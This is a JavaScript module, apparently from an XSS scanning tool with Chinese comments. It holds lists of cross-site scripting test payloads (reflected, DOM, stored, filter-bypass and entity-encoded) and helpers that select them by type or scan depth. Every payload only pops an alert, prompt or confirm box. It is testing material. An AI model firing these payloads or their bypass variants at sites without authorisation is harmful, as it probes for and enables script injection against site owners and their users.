/**
 * XSS载荷库
 * 包含各种XSS测试载荷
 */
export const xssPayloads = {
  // 基础反射型XSS载荷
  reflective: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '\'"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>'
  ],

  // DOM型XSS载荷
  dom: [
    '#<script>alert(1)</script>',
    '#<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    '\'"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
  ],

  // 存储型XSS载荷（需要更隐蔽）
  stored: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<textarea onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>'
  ],

  // 绕过过滤的载荷
  bypass: [
    '<ScRiPt>alert(1)</ScRiPt>',
    '<<script>alert(1);//<</script>',
    '<script>alert(1)</script <!--',
    '<script>alert(1)</script <comment>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<script>prompt(1)</script>',
    '<script>confirm(1)</script>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<svg onload=prompt(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload=\'alert(1)\'>',
    '<svg onload="alert(1)">',
    '<svg%0Aonload="alert(1)">',
    '<svg%00onload="alert(1)">',
    '<svg%09onload="alert(1)">'
  ],

  // HTML实体编码载荷
  encoded: [
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '&lt;img src=x onerror=alert(1)&gt;',
    '&#60;img src=x onerror=alert(1)&#62;',
    '&#x3C;img src=x onerror=alert(1)&#x3E;'
  ]
};

/**
 * 根据检测类型获取载荷
 * @param {string} type - 载荷类型
 * @returns {Array<string>}
 */
export function getPayloadsByType(type = 'reflective') {
  return xssPayloads[type] || xssPayloads.reflective;
}

/**
 * 获取随机载荷
 * @param {string} type - 载荷类型
 * @returns {string}
 */
export function getRandomPayload(type = 'reflective') {
  const payloads = getPayloadsByType(type);
  return payloads[Math.floor(Math.random() * payloads.length)];
}

/**
 * 根据检测深度返回载荷列表
 * @param {number} depth - 检测深度（1-3）
 * @returns {Array<string>}
 */
export function getPayloadsByDepth(depth = 1) {
  const allPayloads = [];
  
  // 深度1：基础载荷
  if (depth >= 1) {
    allPayloads.push(...xssPayloads.reflective.slice(0, 5));
  }
  
  // 深度2：添加更多载荷
  if (depth >= 2) {
    allPayloads.push(...xssPayloads.reflective.slice(5, 10));
    allPayloads.push(...xssPayloads.bypass.slice(0, 5));
  }
  
  // 深度3：全量载荷
  if (depth >= 3) {
    allPayloads.push(...xssPayloads.reflective);
    allPayloads.push(...xssPayloads.bypass);
    allPayloads.push(...xssPayloads.dom);
  }

  return allPayloads;
}
